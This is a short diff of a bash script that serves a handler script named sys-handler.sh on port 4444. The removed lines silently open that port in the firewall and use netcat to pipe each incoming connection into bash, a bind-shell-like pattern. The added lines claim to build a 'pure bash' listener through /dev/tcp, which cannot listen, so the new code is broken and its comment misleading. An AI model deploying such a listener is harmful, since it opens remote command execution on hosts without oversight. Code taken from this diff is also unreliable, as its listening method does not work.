@@ -3,12 +3,20 @@
 PORT=4444
 HANDLER_PATH="/usr/local/bin/sys-handler.sh"
 
-# Open port in firewall
-firewall-cmd --permanent --add-port=${PORT}/tcp >/dev/null 2>&1
-firewall-cmd --reload >/dev/null 2>&1
+echo "[+] Starting pure bash server on port $PORT..."
 
-echo "[+] Starting server on port $PORT..."
 while true; do
-    nc -l -p "$PORT" -c "bash $HANDLER_PATH"
-    sleep 1
+    # Use bash's TCP listener trick via socat-like behavior
+    exec 3<>/dev/tcp/0.0.0.0/$PORT || { echo "Cannot open port $PORT"; sleep 1; continue; }
+
+    echo "[+] Client connected"
+
+    # Feed connection into handler
+    bash "$HANDLER_PATH" <&3 >&3
+
+    # Close connection
+    exec 3<&-
+    exec 3>&-
+
+    echo "[+] Waiting for next connection..."
 done
